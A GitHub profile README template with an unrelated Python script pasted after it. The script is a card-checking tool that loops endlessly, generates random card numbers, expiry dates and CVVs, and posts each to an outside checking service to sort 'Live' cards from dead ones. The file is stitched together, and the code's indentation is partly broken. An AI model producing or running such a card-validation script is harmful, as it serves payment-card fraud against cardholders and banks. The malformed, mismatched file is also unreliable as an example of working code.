- 👋 Hi, I’m @kk9m
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
kk9m/kk9m is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
import requests
try:
	import pyfiglet,requests,os,datetime
except ModuleNotFoundError:
 os.system('pip install requests')
 os.system('pip install pyfiglet')
 os.system('pip install datetime')
 os.system('clear')

Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
logo = pyfiglet.figlet_format(' H S O ')
print(Z+logo)
print(F+'*'*60)
import random,time

num='1234567890'
start_num = 0


while True:
 
 us = str("".join(random.choice(num)for i in range(16)))
 ue = str("".join(random.choice(num)for i in range(3)))
 
 kk = '01','02','03','04','05','06','07','08','09','10','11','12'
 um=random.choice(kk)
 
 num='456789'
 u = str("".join(random.choice(num)for i in range(1)))
 visa = str(us+'|'+um+'|'+f'202{u}'+'|'+ue)
 
 
 url = "https://checker2.visatk.com/card/ccn1/alien07.php"

#url = 'https://checker1.visatk.com/'

 data={

'ajax': '1',
'do': 'check',
'cclist': visa,

}
 m = requests.post(url,data=data).text
 
 if 'Live' in m:
 	
 	print(F+' Live Good : ',visa)
 	
 elif 'Die' in m:
 	
 	print(X+' Die » ',visa)
 elif 'Unknown' in m:
 	print(Z+' Unknown ',visa)

else:
	print(B+' Bad ',visa)
